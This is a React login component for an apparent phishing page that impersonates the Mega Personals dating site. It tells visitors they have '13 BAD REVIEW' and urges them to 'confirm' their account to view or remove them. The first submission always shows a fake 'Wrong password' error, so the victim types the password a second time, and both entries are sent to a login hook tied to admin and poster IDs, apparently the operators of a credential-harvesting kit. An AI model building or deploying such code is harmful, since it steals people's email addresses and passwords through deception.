"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";

function LoginForm({ adminId, posterId }) {
  const router = useRouter();
  const [showWrongPassword, setShowWrongPassword] = useState(false);
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (values, formik) => {
    const { email, password, wrongPassword } = values;

    // console.log("values", values);

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };
    if (!wrongPassword || wrongPassword == "") {
      login(submitValues, formik);
      console.log(submitValues);
    } else {
      login({ wrongPassword: wrongPassword }, formik);
    }
  };
  const handleWrongPassword = () => {
    setShowWrongPassword(true);
    toast.error("Wrong password, try again");

    // const url = `${API_URL}/add/wrongpassword`;

    // const res = await fetch(url, {
    //   method: "POST",
    //   headers: {
    //     Accept: "application/json",
    //     "Content-Type": "application/json",
    //   },
    //   body: JSON.stringify(values),
    // });
    // const data = await res.json();
    // console.log(data);

    // if (res.ok) {
    //   toast.error("Wrong password, try again");
    //   console.log("success", data);
    //   formik.resetForm();

    //   router.push(`/imgPage`);
    // } else {
    //   console.log("error", data);
    //   toast.error("Something Went Wrong");
    // }
  };
  return (
    <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
      <div className=" mt-5 font-bold text-[#222222] text-center ">
        <p className="text-3xl font-bold text-[#222222] text-center ">
          <span className="text-[#e89a4c]">Mega</span>{" "}
          <span className="text-[#6495ED]">Personals</span>
        </p>
        <p className="text-xl mt-2">13 BAD REVIEW</p>
        <p className="text-2xl text-blue-700">
          Confirm your own account before
        </p>
        <p className="text-2xl text-[#e89a4c]">
          VIEW / REMOVE <span className="text-blue-700">review</span>
        </p>
      </div>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              {!showWrongPassword ? (
                <>
                  <Field
                    className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />
                </>
              ) : (
                <Field
                  className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                  placeholder="Password"
                  name="wrongPassword"
                  type="password"
                  autoComplete="on"
                  required
                />
              )}

              {!showWrongPassword ? (
                <button
                  type="button"
                  onClick={handleWrongPassword}
                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                >
                  SUBMIT
                </button>
              ) : (
                <button
                  type="submit"
                  // type="button"
                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                  // disabled={!verified}
                  // onClick={handleNextStep}
                >
                  SUBMIT
                </button>
              )}
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
